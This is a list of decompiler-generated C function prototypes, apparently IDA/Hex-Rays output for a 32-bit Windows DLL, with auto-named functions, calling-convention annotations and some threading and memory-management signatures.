_DWORD *__thiscall sub_100289EE(int *this, _DWORD *a2);
void __thiscall sub_10028A44(_DWORD *this);
int *__thiscall sub_10028A69(void *this, int *a2, unsigned int pExceptionObject);
int *__thiscall sub_10028AD1(void *this, int *a2, unsigned int pExceptionObject);
void __thiscall sub_10028B39(void *this, int a2);
void __thiscall sub_10028B71(void *this, int a2, int a3);
void __thiscall sub_10028BAC(void *this, int a2);
int __thiscall sub_10028BE4(void *this, int a2);
int __thiscall sub_10028C20(void *this, int a2);
void __thiscall sub_10028C5C(void *this);
_DWORD *__thiscall sub_10028CB5(_DWORD *Block, char a2);
int *__stdcall sub_10028CD4(int *Block);
_DWORD *__thiscall sub_10028CEF(_DWORD *Block, char a2);
_DWORD *__thiscall sub_10028D0E(_DWORD *Block, char a2);
_DWORD *__thiscall sub_10028D2E(_DWORD *Block, char a2);
void __stdcall sub_10028D4E(int *a1);
// void __usercall sub_10028D6E(int a1@<ecx>, int a2@<edi>);
_DWORD *__stdcall sub_10028DCA(_DWORD *a1);
// int __usercall sub_10028DF5@<eax>(int a1@<ecx>, int a2@<esi>);
// int __usercall sub_10028E35@<eax>(int a1@<ecx>, int a2@<esi>);
_DWORD *__thiscall sub_10028E66(void *this, _DWORD *a2, int a3, int a4);
void __thiscall sub_10028EA0(_DWORD *this);
BOOL __thiscall sub_10028EC5(_DWORD *this);
BOOL __thiscall sub_10028ECE(_DWORD *this);
int __thiscall sub_10028ED7(_DWORD *this);
int __thiscall sub_10028EFB(_DWORD *this);
int __thiscall sub_10028F28(_DWORD *this);
int *__thiscall sub_10028F55(int this);
_DWORD *__thiscall sub_10028FCB(_DWORD *this, int a2);
_DWORD *__thiscall sub_10029050(void *this, _DWORD *a2, int a3, int a4);
void __thiscall sub_1002908A(_DWORD *this);
BOOL __thiscall sub_100290AF(_DWORD *this);
BOOL __thiscall sub_100290B8(_DWORD *this);
int __thiscall sub_100290C1(_DWORD *this);
int __thiscall sub_100290E5(_DWORD *this);
int __thiscall sub_10029112(_DWORD *this);
int *__thiscall sub_1002913F(int this);
_DWORD *__thiscall sub_100291B5(_DWORD *this, int a2);
_DWORD *__thiscall sub_1002923A(_DWORD *Block, char a2);
_DWORD *__thiscall sub_10029259(_DWORD *Block, char a2);
_DWORD *__stdcall sub_1002928D(_DWORD *a1, int a2, int a3, int a4, int a5, int a6);
// _DWORD *__userpurge sub_100292D6@<eax>(_DWORD *a1@<esi>, int a2);
// _DWORD *__userpurge sub_1002932C@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_1002936B(void *this);
// _DWORD *__userpurge sub_100293B0@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_100293EF(void *this);
// void __usercall sub_10029432(int a1@<esi>);
// void __usercall sub_1002946C(int a1@<esi>);
// BOOL __userpurge sub_100294A8@<eax>(_DWORD *a1@<eax>, _DWORD *a2);
int __thiscall sub_100294D3(int *this, int a2);
int __thiscall sub_1002958C(int *this, int a2);
int __thiscall sub_1002960E(int *this);
int *__stdcall sub_1002968A(int *a1, int *a2, int a3);
// int __usercall sub_10029762@<eax>(int a1@<ecx>, int *a2@<ebx>);
int __thiscall sub_100297DF(_DWORD *this, int *a2);
// int __usercall sub_10029866@<eax>(int *a1@<ecx>, int a2@<ebx>);
void __fastcall sub_100298FF(int a1, int a2, int *a3, int a4);
// int __userpurge sub_10029947@<eax>(int a1@<esi>, _DWORD *a2);
_DWORD *__thiscall sub_100299D5(_DWORD *Block, char a2);
// int __usercall sub_100299F4@<eax>(int a1@<ecx>, int a2@<esi>);
int __thiscall sub_10029A1B(_DWORD *this);
// _DWORD *__usercall sub_10029A51@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edi>);
int __stdcall sub_10029A76(int a1, int a2, int a3);
// bool __userpurge sub_10029AF9@<al>(int a1@<esi>, void *a2);
BOOL __thiscall sub_10029B8C(_BYTE *this);
_DWORD *__stdcall sub_10029C77(_DWORD *a1);
_DWORD *__thiscall sub_10029CA5(_DWORD *Block, char a2);
void __thiscall sub_10029CC4(_DWORD *this);
// int __userpurge sub_10029CE8@<eax>(int a1@<ecx>, int a2@<edi>, int a3, int a4);
void *__thiscall sub_10029D6D(void *Block, char a2);
int __stdcall sub_10029D8C(int a1);
int __thiscall sub_10029DE8(int this);
// SIZE_T __userpurge sub_10029E64@<eax>(int a1@<esi>, PMEMORY_BASIC_INFORMATION lpBuffer);
// _DWORD __stdcall sub_10029EF7(_DWORD, _DWORD); weak
// int __userpurge sub_10029F50@<eax>(int a1@<edi>, _DWORD *a2);
// DWORD __usercall sub_10029F8C@<eax>(int a1@<esi>);
char *__thiscall sub_10029FA0(char *this);
// DWORD __usercall sub_10029FA4@<eax>(int a1@<esi>);
// BOOL __usercall sub_10029FC8@<eax>(int a1@<esi>);
// BOOL __usercall sub_10029FD8@<eax>(int a1@<esi>);
int __thiscall sub_1002A03E(int this, int pExceptionObject);
int __thiscall sub_1002A0CB(_DWORD *this);
// DWORD __userpurge sub_1002A0D2@<eax>(int a1@<edi>, DWORD flNewProtect);
int __thiscall sub_1002A148(_DWORD *this, _DWORD *a2);
LONG __thiscall sub_1002A27F(void *this, char a2);
int __thiscall sub_1002A2BD(_DWORD *this);
unsigned int __thiscall sub_1002A2C1(_DWORD *this, int pExceptionObject, int a3);
// BOOL __usercall sub_1002A319@<eax>(int a1@<eax>);
SIZE_T __thiscall sub_1002A361(_DWORD *this, _DWORD *nSize);
char sub_1002A400();
int __thiscall sub_1002A403(void *this, _BYTE *a2);
BOOL __thiscall sub_1002A45B(_DWORD *this);
void *__thiscall sub_1002A46D(char *this, char a2);
int __thiscall sub_1002A475(_DWORD *this);
char sub_1002A47D();
unsigned int __thiscall sub_1002A485(_DWORD *this, int a2, int a3);
_DWORD *__thiscall sub_1002A49B(_DWORD *Block, char a2);
void __thiscall sub_1002A4BF(_DWORD *this);
_BYTE *__thiscall sub_1002A516(_BYTE *this, int a2);
LPVOID sub_1002A534();
int __stdcall sub_1002A54A(int a1);
int *__thiscall sub_1002A5A1(int *Block, char a2);
void __stdcall __noreturn pfnAPC(ULONG_PTR Parameter);
void __thiscall sub_1002A5FD(int this, int a2);
int __thiscall sub_1002A77E(unsigned int *this);
int __thiscall sub_1002A847(int *this);
void __thiscall sub_1002A893(int *this);
int __thiscall sub_1002A8FF(_DWORD *this);
int sub_1002A903();
int __thiscall sub_1002A907(_DWORD *this);
int __thiscall sub_1002A92C(_DWORD *this);
int __thiscall sub_1002A954(int *this);
char __thiscall sub_1002A9CC(int *this);
void __thiscall sub_1002AA5D(int *this, int a2, char a3);
void __thiscall sub_1002AAE9(int *this, DWORD dwExitCode);
void __thiscall sub_1002AB7A(int *this, int a2);
void __thiscall sub_1002AC27(_DWORD *this);
unsigned int __stdcall StartAddress(int *lpTlsValue);
void __thiscall sub_1002AE65(_DWORD *this);
BOOL __thiscall sub_1002AE8A(void *this);
int __thiscall sub_1002AEA3(int this, int a2);
int __thiscall sub_1002AED4(int this, int a2);
_DWORD *__thiscall sub_1002AF05(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1002AF56(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1002AFA9(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1002AFFC(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1002B057(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1002B0B2(void *this, _DWORD *a2, unsigned int pExceptionObject);
_DWORD *__thiscall sub_1002B127(void *this, _DWORD *a2, unsigned int pExceptionObject);
void __thiscall sub_1002B19C(_DWORD *this);
int *__thiscall sub_1002B1C1(void *this, int *a2, unsigned int pExceptionObject);
int *__thiscall sub_1002B229(void *this, int *a2, unsigned int pExceptionObject);
void __thiscall sub_1002B291(void *this, int a2);
void __thiscall sub_1002B2C9(void *this, int a2, int a3);
void __thiscall sub_1002B304(void *this, int a2);
int __thiscall sub_1002B33C(void *this, int a2);
int __thiscall sub_1002B378(void *this, int a2);
void __thiscall sub_1002B3B4(void *this);
_DWORD *__thiscall sub_1002B3FC(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1002B41B(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1002B43B(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1002B45B(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1002B47A(_DWORD *Block, char a2);
// int __usercall sub_1002B49F@<eax>(int a1@<ecx>, int a2@<esi>);
int __thiscall sub_1002B4D0(void *this, int a2);
// int __usercall sub_1002B503@<eax>(int a1@<ecx>, int a2@<esi>);
_DWORD *__thiscall sub_1002B542(void *this, _DWORD *a2);
BOOL __thiscall sub_1002B57F(int this);
BOOL __thiscall sub_1002B592(_DWORD *this);
int __thiscall sub_1002B59C(int this);
void __thiscall sub_1002B5CA(_DWORD *this);
void __thiscall sub_1002B5CE(_DWORD *this);
void __noreturn sub_1002B5D2(); // weak
void __noreturn sub_1002B5EF(); // weak
_DWORD *__thiscall sub_1002B613(void *this, _DWORD *a2, int a3);
void __thiscall sub_1002B647(_DWORD *this);
bool __thiscall sub_1002B66C(int this);
BOOL __thiscall sub_1002B683(_DWORD *this);
int __thiscall sub_1002B68D(int this);
int __thiscall sub_1002B6C8(int this);
int __thiscall sub_1002B6FE(_DWORD *this);
int __thiscall sub_1002B726(int this);
int __thiscall sub_1002B761(int this, int a2);
_DWORD *__thiscall sub_1002B77D(void *this, _DWORD *a2, int a3);
void __thiscall sub_1002B7B1(_DWORD *this);
bool __thiscall sub_1002B7D6(int this);
BOOL __thiscall sub_1002B7ED(_DWORD *this);
int __thiscall sub_1002B7F7(int this);
int __thiscall sub_1002B832(int this);
int __thiscall sub_1002B868(_DWORD *this);
int __thiscall sub_1002B890(int this);
int __thiscall sub_1002B8CB(int this, int a2);
_DWORD *__thiscall sub_1002B8E7(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1002B907(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1002B927(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1002B946(_DWORD *Block, char a2);
_DWORD *__stdcall sub_1002B965(_DWORD *a1);
void **__thiscall sub_1002B9D0(void **this, void **a2);
void __thiscall sub_1002BA12(int this);
int __thiscall sub_1002BA61(_DWORD *this);
int __thiscall sub_1002BA65(_DWORD *this, _DWORD *a2, unsigned int a3);
int __thiscall sub_1002BAC2(int *this, int a2);
int __thiscall sub_1002BADD(_DWORD *this, unsigned int a2);
int __thiscall sub_1002BB29(_DWORD *this, int a2);
int __thiscall sub_1002BB4A(_DWORD *this, int a2);
void __thiscall sub_1002BB6B(_DWORD *this, unsigned int a2);
int __thiscall sub_1002BB90(void **this);
BOOL __thiscall sub_1002BBB4(void *this);
int __thiscall sub_1002BBBF(_DWORD *this, unsigned int a2);
unsigned int __thiscall sub_1002BC01(_DWORD *this, unsigned int a2, int a3, int a4);
unsigned int __thiscall sub_1002BC73(void *this, unsigned int pExceptionObject, int a3);
unsigned int __stdcall sub_1002BC9B(unsigned int a1, unsigned int a2);
unsigned int __thiscall sub_1002BCAE(_DWORD *this, int a2, int a3, int a4);
void __thiscall sub_1002BD0C(_DWORD *this);
void __thiscall sub_1002BDC2(_DWORD *this);
bool __thiscall sub_1002BE0D(_DWORD *this, _DWORD *a2);
char __thiscall sub_1002BE47(_DWORD *this, _DWORD *a2);
int __thiscall sub_1002BE96(_DWORD *this, _DWORD *a2);
int __thiscall sub_1002BEEE(_DWORD *this, _DWORD *pExceptionObject);
_DWORD *__thiscall sub_1002BF43(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_1002BF74(_DWORD *this, _DWORD *a2);
int __thiscall sub_1002BFA5(_DWORD *this, int a2);
int __thiscall sub_1002BFC0(_DWORD *this);
int __thiscall sub_1002BFD4(_DWORD *this);
_DWORD *__stdcall sub_1002BFDC(_DWORD *a1);
void __thiscall sub_1002C008(_DWORD *this);
int __thiscall sub_1002C02F(_DWORD *this);
BOOL __thiscall sub_1002C03B(_DWORD *this, int a2);
int __thiscall sub_1002C067(_DWORD *this);
int __thiscall sub_1002C073(_DWORD *this, int a2);
int __thiscall sub_1002C0A4(_DWORD *this, int a2);
int __thiscall sub_1002C0D5(_DWORD *this);
int __thiscall sub_1002C0E1(_DWORD *this);
int __thiscall sub_1002C0E9(_DWORD *this);
// _DWORD *__userpurge sub_1002C105@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_1002C144(void *this);
// _DWORD *__userpurge sub_1002C175@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_1002C1B4(void *this);
// _DWORD *__userpurge sub_1002C1F3@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_1002C232(void *this);
void *__thiscall sub_1002C263(void *Block, char a2);
_DWORD *__thiscall sub_1002C282(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1002C2A1(_DWORD *Block, char a2);
// _DWORD *__userpurge sub_1002C2C0@<eax>(_DWORD *a1@<esi>, _DWORD *a2);
_DWORD *__stdcall sub_1002C30E(_DWORD *a1);
// int __userpurge sub_1002C351@<eax>(_DWORD *a1@<ebx>, _DWORD *a2);
// void __usercall sub_1002C3E4(int a1@<esi>);
// void __usercall sub_1002C40C(int a1@<esi>);
// void __usercall sub_1002C446(int a1@<esi>);
_DWORD *__stdcall sub_1002C46E(_DWORD *a1);
_DWORD *__stdcall sub_1002C499(_DWORD *a1);
_DWORD *__stdcall sub_1002C4C4(_DWORD *a1);
// void *__usercall sub_1002C515@<eax>(int a1@<eax>, _DWORD *a2@<esi>);
_DWORD *__stdcall sub_1002C535(_DWORD *a1);
void __thiscall sub_1002C563(_DWORD *this);
_DWORD *__stdcall sub_1002C587(_DWORD *a1);
void __thiscall sub_1002C5B5(_DWORD *this);
_DWORD *__stdcall sub_1002C5D9(_DWORD *a1);
_DWORD *__thiscall sub_1002C607(_DWORD *Block, char a2);
void __thiscall sub_1002C626(_DWORD *this);
_DWORD *__stdcall sub_1002C64A(_DWORD *a1);
_DWORD *__thiscall sub_1002C6AA(_DWORD *Block, char a2);
void __thiscall sub_1002C6C9(_DWORD *this);
void __thiscall sub_1002C6D4(_DWORD *this);
DWORD __cdecl sub_1002C705(HANDLE Handles, int a2);
DWORD __cdecl sub_1002C718(HANDLE *lpHandles, int a2);
// int __usercall sub_1002C762@<eax>(int a1@<eax>, int a2@<esi>);
// _DWORD *__userpurge sub_1002C8C7@<eax>(int a1@<edi>, _DWORD *a2, int a3, char pExceptionObject);
// Concurrency::details::ThreadScheduler *__thiscall Concurrency::details::ThreadScheduler::ThreadScheduler(Concurrency::details::ThreadScheduler *this, const struct Concurrency::SchedulerPolicy *a2);
// void *__thiscall sub_1002CA17(_DWORD *this, void *a2, int a3, char pExceptionObject);
_DWORD *__stdcall sub_1002CA8D(_DWORD *a1);
_DWORD *__thiscall sub_1002CABB(_DWORD *Block, char a2);
void __thiscall sub_1002CADA(_DWORD *this);
_DWORD *__stdcall sub_1002CAFE(_DWORD *a1, int a2);
int __stdcall sub_1002CB36(int a1);
void __thiscall sub_1002CB94(_DWORD *this);
_DWORD *__stdcall sub_1002CBB8(_DWORD *a1);
_DWORD *__thiscall sub_1002CBE6(_DWORD *Block, char a2);
void __thiscall sub_1002CC05(_DWORD *this);
_DWORD *__stdcall sub_1002CC29(_DWORD *a1);
void __thiscall sub_1002CC57(_DWORD *this);
_DWORD *__stdcall sub_1002CC7B(_DWORD *a1);
void __thiscall sub_1002CCA9(_DWORD *this);
// int __usercall sub_1002CCCD@<eax>(int result@<eax>);
int __cdecl sub_1002CCDA(int a1, int a2);
// DWORD __usercall sub_1002CD14@<eax>(int a1@<edi>, _DWORD *a2, _DWORD *a3);
int __stdcall sub_1002CE5D(int a1);
unsigned int __stdcall sub_1002CE6F(int a1);
// int __usercall sub_1002CEA0@<eax>(__int32 a1@<eax>, int a2@<esi>);
// int __usercall sub_1002CEBB@<eax>(_DWORD *a1@<ecx>, int a2@<esi>);
int __fastcall sub_1002CF03(int a1, char a2);
void __thiscall sub_1002CF3A(void **this);
void **__thiscall sub_1002CF72(void **Block, char a2);
// int __userpurge sub_1002CF91@<eax>(__int32 a1@<eax>, int a2);
// int __usercall sub_1002CFA6@<eax>(__int32 a1@<eax>);
char __cdecl sub_1002D042(int a1, int a2, int a3);
int __stdcall sub_1002D15F(int a1, DWORD dwMaximumSizeLow, LPSECURITY_ATTRIBUTES lpFileMappingAttributes, int a4, int a5);
_DWORD *__thiscall sub_1002D2A2(_DWORD *Block, char a2);
bool __thiscall sub_1002D2C1(_DWORD *this);
_DWORD *__stdcall sub_1002D306(_DWORD *a1, int a2);
int __thiscall sub_1002D376(_DWORD *this);
_DWORD *__stdcall sub_1002D3CB(_DWORD *a1);
int __thiscall sub_1002D422(_DWORD *this);
_DWORD *__stdcall sub_1002D44E(_DWORD *a1);
int __thiscall sub_1002D4A5(_DWORD *this);
_DWORD *__stdcall sub_1002D4D1(_DWORD *a1);
int __thiscall sub_1002D528(_DWORD *this);
_DWORD *__stdcall sub_1002D554(_DWORD *a1, int a2);
char *__thiscall sub_1002D5B1(char *this, char a2);
// void __usercall sub_1002D5D3(int a1@<eax>);
int __thiscall sub_1002D5E8(_DWORD *this);
_DWORD *__stdcall sub_1002D614(_DWORD *a1);
int __thiscall sub_1002D66B(_DWORD *this);
_DWORD *__stdcall sub_1002D697(_DWORD *a1);
int __thiscall sub_1002D6E8(_DWORD *this);
_DWORD *__stdcall sub_1002D71D(_DWORD *a1, int a2);
int __thiscall sub_1002D77A(_DWORD *this);
_DWORD *__stdcall sub_1002D7A6(_DWORD *a1);
int __thiscall sub_1002D7FD(_DWORD *this);
void __thiscall sub_1002D830(_DWORD *this);
void __thiscall sub_1002D854(_DWORD *this);
_DWORD *__thiscall sub_1002D878(_DWORD *Block, char a2);
void __thiscall sub_1002D897(_DWORD *this);
_DWORD *__thiscall sub_1002D8BB(_DWORD *Block, char a2);
void __thiscall sub_1002D8DA(_DWORD *this);
_DWORD *__thiscall sub_1002D8FE(_DWORD *Block, char a2);
void __thiscall sub_1002D91D(_DWORD *this);
_DWORD *__thiscall sub_1002D948(_DWORD *Block, char a2);
void __cdecl __noreturn sub_1002D96F(int a1);
_DWORD *__thiscall sub_1002D98F(_DWORD *Block, char a2);
void __thiscall sub_1002D9AE(_DWORD *this);
int __stdcall sub_1002D9DE(int a1, int a2);
void *__thiscall sub_1002DA3E(void *Block, char a2);
void __thiscall sub_1002DA5D(int this);
void __thiscall sub_1002DAB2(int this, int *a2);
void __thiscall sub_1002E025(_DWORD *this);
_DWORD *__thiscall sub_1002E038(_DWORD *this, int a2, int a3);
_DWORD *__thiscall sub_1002E0D4(_DWORD *this, int a2, int a3);
char *__thiscall sub_1002E13D(_DWORD *this, char a2);
_DWORD *__thiscall sub_1002E15F(_DWORD *this, char a2);
// _DWORD *__userpurge sub_1002E1A8@<eax>(_DWORD *a1@<esi>, int a2);
_DWORD *__stdcall sub_1002E1E7(_DWORD *a1);
void __thiscall sub_1002E215(_DWORD *this);
// _DWORD *__userpurge sub_1002E239@<eax>(_DWORD *a1@<ebx>, _DWORD *a2);
int __thiscall sub_1002E269(_DWORD *this, int a2);
bool sub_1002E2A5();
int __fastcall sub_1002E2C9(int a1, _DWORD *a2);
void __stdcall sub_1002E35A(int a1);
int __fastcall sub_1002E388(int a1, int *a2);
_DWORD *__thiscall sub_1002E433(_DWORD *Block, char a2);
_DWORD *__stdcall sub_1002E45A(_DWORD *a1);
void __thiscall sub_1002E488(_DWORD *this);
_DWORD *__stdcall sub_1002E4AC(_DWORD *a1);
void __thiscall sub_1002E4D9(_DWORD *this);
_DWORD *__stdcall sub_1002E4FD(_DWORD *a1);
void __thiscall sub_1002E52A(_DWORD *this);
_DWORD *__stdcall sub_1002E54E(_DWORD *a1);
void __thiscall sub_1002E57B(_DWORD *this);
_DWORD *__stdcall sub_1002E59F(_DWORD *a1);
void __thiscall sub_1002E5CC(_DWORD *this);
_DWORD *__stdcall sub_1002E5F0(_DWORD *a1);
void __thiscall sub_1002E61D(_DWORD *this);
_DWORD *__stdcall sub_1002E641(_DWORD *a1);
int __thiscall sub_1002E66E(_DWORD *this);
_DWORD *__stdcall sub_1002E692(_DWORD *a1, int a2);
int *__thiscall sub_1002E6F9(int *Block, char a2);
// _DWORD *__userpurge sub_1002E718@<eax>(int a1@<ebx>, _DWORD *a2);
void __thiscall sub_1002E779(int *this);
_DWORD *__thiscall sub_1002E818(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1002E84B(void *this, _DWORD *a2);
_DWORD *__stdcall sub_1002E87E(_DWORD *a1);
int *__thiscall sub_1002E8C1(int *Block, char a2);
// _DWORD *__userpurge sub_1002E8E0@<eax>(int a1@<esi>, _DWORD *a2);
_DWORD *__stdcall sub_1002E933(_DWORD *a1, int a2, int a3, int a4);
void __thiscall sub_1002E984(int *this);
// _DWORD *__usercall sub_1002E9B9@<eax>(_DWORD *a1@<eax>);
_DWORD *__thiscall sub_1002E9DA(_DWORD *this, _DWORD *a2);
// unsigned int __usercall sub_1002EA77@<eax>(_DWORD *a1@<edi>);
// int *__usercall sub_1002EAA4@<eax>(int *a1@<ebx>, int *a2@<esi>);
// bool __usercall sub_1002EACF@<al>(int a1@<edi>, int a2@<esi>);
_DWORD *__stdcall sub_1002EB0E(_DWORD *a1, int a2);
_BYTE *__thiscall sub_1002EB40(_BYTE *Block, char a2);
void __thiscall sub_1002EB5F(_BYTE *this);
void __thiscall sub_1002EB83(void *this, int a2, unsigned int a3);
__int16 __thiscall sub_1002EBC8(void *this);
int __thiscall sub_1002EBDD(void *this);
_DWORD *__thiscall sub_1002EBF1(void *this, _DWORD *a2);
char sub_1002EC78();
int sub_1002EC8C();
char sub_1002EC8F();
int __thiscall sub_1002EC93(_DWORD *this);
bool __thiscall sub_1002EC97(_DWORD *this);
_DWORD *__thiscall sub_1002ECCA(_DWORD *Block, char a2);
// _DWORD *__userpurge sub_1002ECE9@<eax>(int a1@<ebx>, _DWORD *a2);
int __stdcall sub_1002ED52(int a1, int a2);
char __thiscall sub_1002EE22(_BYTE *this);
DWORD __thiscall sub_1002EE26(int this);
int __thiscall sub_1002EEA6(int this);
_DWORD *__stdcall sub_1002EECB(int pExceptionObject, _DWORD *a2, int a3);
void __noreturn sub_1002EF20(void); // weak
_DWORD *__thiscall sub_1002EF3F(_DWORD *Block, char a2);
BOOL __thiscall sub_1002EF5E(_DWORD *this);
// int __userpurge sub_1002EFAA@<eax>(int a1@<edi>, int a2, char a3, char a4, char a5);
int *__thiscall sub_1002F007(int *Block, char a2);
void __thiscall sub_1002F026(int *this);
// int __userpurge sub_1002F065@<eax>(int a1@<esi>, int a2);
void __stdcall sub_1002F0BE(int a1);
_DWORD *__stdcall sub_1002F15C(_DWORD *a1, int a2, int a3, int a4);
_DWORD *__stdcall sub_1002F1A2(_DWORD *a1, int a2);
_DWORD *__stdcall sub_1002F1DD(int a1, _DWORD *a2);
void __thiscall sub_1002F212(int *this, int a2, int a3);
_DWORD *__stdcall sub_1002F259(_DWORD *a1, int a2, volatile LONG *lpAddend, int a4, int a5);
int *__thiscall sub_1002F321(int *Block, char a2);
void __stdcall sub_1002F341(int *a1);
_DWORD *__fastcall sub_1002F38A(int a1, int a2, _DWORD *a3);
void __thiscall sub_1002F3F0(_DWORD *this, int a2, int a3);
void __thiscall sub_1002F430(_DWORD *this, int a2, int a3);
void __thiscall sub_1002F470(_DWORD *this, int a2, int a3);
void __thiscall sub_1002F4B0(_DWORD *this, int a2, int a3);
void __thiscall sub_1002F4F0(_DWORD *this, int a2, int a3, int a4);
void __thiscall sub_1002F558(_DWORD *this, int a2, double a3);
LONG __thiscall sub_1002F59D(_DWORD *this, int a2, int a3, int a4, int a5, int a6, int a7, _DWORD *a8);
LONG __thiscall sub_1002F607(_DWORD *this, int a2, int a3, int a4, int a5, int a6, int a7);
char __thiscall sub_1002F66E(_DWORD *this, int a2);
char __thiscall sub_1002F6AF(_DWORD *this, int a2);
__int16 __thiscall sub_1002F6F0(_DWORD *this, int a2);
int __thiscall sub_1002F733(_DWORD *this, int a2);
int __thiscall sub_1002F774(_DWORD *this, int a2, int a3, int a4);
int __thiscall sub_1002F7C3(_DWORD *this, int a2, int a3);
void *__thiscall sub_1002F80F(_DWORD *this, void *a2, int a3);
void __thiscall sub_1002F85B(_DWORD *this, int a2);
int __thiscall sub_1002F89E(_DWORD *this, int a2);
char __thiscall sub_1002F8DF(_DWORD *this, int a2);
void __thiscall sub_1002F920(_DWORD *this, int a2);
_DWORD *__thiscall sub_1002F95D(_DWORD *this, _DWORD *a2, int a3);
int __thiscall sub_1002FA2D(int **this);
int __thiscall sub_1002FA38(int *this);
_DWORD *__stdcall sub_1002FA43(_DWORD *a1, int a2);
_BYTE *__thiscall sub_1002FA7D(_BYTE *Block, char a2);
int __thiscall sub_1002FA9C(_BYTE *this);
int __thiscall sub_1002FADE(void *this, int a2);
int __thiscall sub_1002FB03(void *this, _DWORD *a2);
int __thiscall sub_1002FB28(_DWORD *this);
char sub_1002FB2C();
_DWORD *__stdcall sub_1002FB2F(_DWORD *a1, int a2);
_BYTE *__thiscall sub_1002FB69(_BYTE *Block, char a2);
void __thiscall sub_1002FB88(_BYTE *this);
int __thiscall sub_1002FBCA(void *this, char *a2);
int __thiscall sub_1002FBFC(void *this, int *a2);
int __thiscall sub_1002FC4F(void *this);
int __thiscall sub_1002FC5B(_DWORD *this);
char sub_1002FC5F();
_DWORD *__stdcall sub_1002FC62(_DWORD *a1, int a2);
_BYTE *__thiscall sub_1002FC94(_BYTE *Block, char a2);
void __thiscall sub_1002FCB3(_BYTE *this);
char __fastcall sub_1002FCF5(int a1);
bool __thiscall sub_1002FD09(void *this);
__int16 __thiscall sub_1002FD3D(void *this);
int __thiscall sub_1002FD52(void *this);
double __thiscall sub_1002FD66(void *this);
int __thiscall sub_1002FD7B(void *this, int a2);
int *__thiscall sub_1002FD8F(void *this, int *a2);
_DWORD *__thiscall sub_1002FE63(int *this, _DWORD *a2, char a3);
void __thiscall sub_1002FED5(void *this, int a2, unsigned int a3);
char sub_1002FF1A();
// int __usercall sub_1002FF1D@<eax>(int a1@<eax>, int a2@<esi>);
HLOCAL *__thiscall sub_1002FF35(HLOCAL *Block, char a2);
// HLOCAL *__usercall sub_1002FF62@<eax>(HLOCAL *result@<eax>);
HLOCAL *__thiscall sub_1002FF72(HLOCAL *this);
_DWORD *__stdcall sub_1002FFA3(int a1, _DWORD *a2);
// BOOL __usercall sub_100300EB@<eax>(int a1@<eax>, int a2@<ecx>);
int __stdcall sub_1003011F(int, DWORD pSessionId); // idb
int *__thiscall sub_1003024E(int *Block, char a2);
LONG __stdcall sub_1003026D(int *a1);
// int __usercall sub_1003028D@<eax>(int *a1@<eax>, int a2@<ecx>);
int __thiscall sub_100302A9(_DWORD *this, int a2);
int __thiscall sub_10030344(_DWORD *this, int a2);
void __thiscall sub_10030379(int *this);
void __thiscall sub_100303E0(_ThrowInfo *this);
char __thiscall sub_100303F6(_BYTE *this);
unsigned int __thiscall sub_100303FA(int this);
int __thiscall sub_100305BB(_DWORD *this);
_DWORD *__thiscall sub_100305D1(void **this, _DWORD *a2);
void __thiscall __noreturn sub_10030615(void *this);
void __thiscall sub_10030631(_DWORD *this);
BOOL __thiscall sub_10030656(void *this);
int __thiscall sub_10030668(int this, int a2);
int __thiscall sub_10030699(int this, int a2);
_DWORD *__thiscall sub_100306CA(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1003071B(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1003073A(_DWORD *Block, char a2);
int __thiscall sub_1003075A(void *this, int a2);
_DWORD *__thiscall sub_10030788(void *this, _DWORD *a2);
BOOL __thiscall sub_100307C5(int this);
BOOL __thiscall sub_100307D8(_DWORD *this);
int __thiscall sub_100307E2(int this);
void __thiscall sub_10030810(_DWORD *this);
void __thiscall sub_10030814(_DWORD *this);
void __noreturn sub_10030818(); // weak
void __noreturn sub_10030835(); // weak
_DWORD *__thiscall sub_10030859(_DWORD *Block, char a2);
_DWORD *__thiscall sub_10030879(_DWORD *Block, char a2);
_DWORD *__stdcall sub_10030899(_DWORD *a1);
void __thiscall sub_100308E6(_DWORD *this);
bool __thiscall sub_10030931(_DWORD *this, _DWORD *a2);
char __thiscall sub_1003096B(_DWORD *this, _DWORD *a2);
int __thiscall sub_100309BA(_DWORD *this, _DWORD *a2);
int __thiscall sub_10030A12(_DWORD *this, _DWORD *pExceptionObject);
_DWORD *__thiscall sub_10030A67(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_10030A98(_DWORD *this, _DWORD *a2);
int __thiscall sub_10030AC9(_DWORD *this, int a2);
int __thiscall sub_10030AE4(_DWORD *this);
int __thiscall sub_10030AF8(_DWORD *this);
_DWORD *__stdcall sub_10030B00(_DWORD *a1);
void __thiscall sub_10030B2C(_DWORD *this);
int __thiscall sub_10030B53(_DWORD *this);
BOOL __thiscall sub_10030B5F(_DWORD *this, int a2);
int __thiscall sub_10030B8B(_DWORD *this);
int __thiscall sub_10030B97(_DWORD *this, int a2);
int __thiscall sub_10030BC8(_DWORD *this, int a2);
int __thiscall sub_10030BF9(_DWORD *this);
int __thiscall sub_10030C05(_DWORD *this);
int __thiscall sub_10030C0D(_DWORD *this);
// _DWORD *__userpurge sub_10030C15@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_10030C54(void *this);
_DWORD *__thiscall sub_10030C7F(_DWORD *Block, char a2);
_DWORD *__thiscall sub_10030C9E(_DWORD *Block, char a2);
_DWORD *__stdcall sub_10030CBD(_DWORD *a1);
// int __userpurge sub_10030D00@<eax>(_DWORD *a1@<ebx>, _DWORD *a2);
// void __usercall sub_10030D81(int a1@<esi>);
